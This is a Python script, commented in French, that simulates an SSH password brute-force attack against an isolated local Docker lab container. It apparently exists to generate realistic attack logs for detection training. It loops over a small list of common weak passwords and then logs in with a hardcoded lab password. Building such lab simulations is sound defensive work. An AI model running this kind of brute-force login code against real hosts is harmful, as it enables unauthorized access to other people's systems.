"""
Simule une attaque par force brute SSH (technique MITRE ATT&CK T1110 -
Brute Force) contre le conteneur ssh-target de ce projet, entièrement isolé
sur le réseau Docker local. Aucune machine tierce n'est jamais visée.

Génère un mélange réaliste :
- de nombreuses tentatives avec des mots de passe incorrects (dictionnaire
  de mots de passe faibles courants),
- puis, à la fin, une tentative réussie avec le bon mot de passe —
  exactement le scénario "l'attaquant finit par trouver le mot de passe faible".
"""
import socket
import time

import paramiko

HOST = "localhost"
PORT = 2222
USERNAME = "admin"
REAL_PASSWORD = "changeme123"

COMMON_PASSWORDS = [
    "123456", "password", "admin", "letmein", "qwerty",
    "welcome", "root", "changeme", "admin123", "iloveyou",
]


def try_login(password: str) -> bool:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            HOST, port=PORT, username=USERNAME, password=password,
            timeout=5, banner_timeout=5, auth_timeout=5,
        )
        return True
    except paramiko.AuthenticationException:
        return False
    except (socket.error, paramiko.SSHException) as e:
        print(f"   (connexion : {e})")
        return False
    finally:
        client.close()


def main():
    print(f"=== Simulation de brute-force SSH contre {HOST}:{PORT} ===")
    for i, pwd in enumerate(COMMON_PASSWORDS, start=1):
        print(f"[{i}/{len(COMMON_PASSWORDS)}] Tentative avec le mot de passe '{pwd}'...")
        ok = try_login(pwd)
        print("   -> succès" if ok else "   -> échec")
        time.sleep(1.5)  # rafale rapprochée mais pas instantanée, comme un vrai outil (ex: Hydra)

    print(f"\n[FINAL] Tentative avec le vrai mot de passe '{REAL_PASSWORD}'...")
    ok = try_login(REAL_PASSWORD)
    print("   -> succès, l'attaquant a trouvé le mot de passe !" if ok else "   -> échec inattendu")


if __name__ == "__main__":
    main()
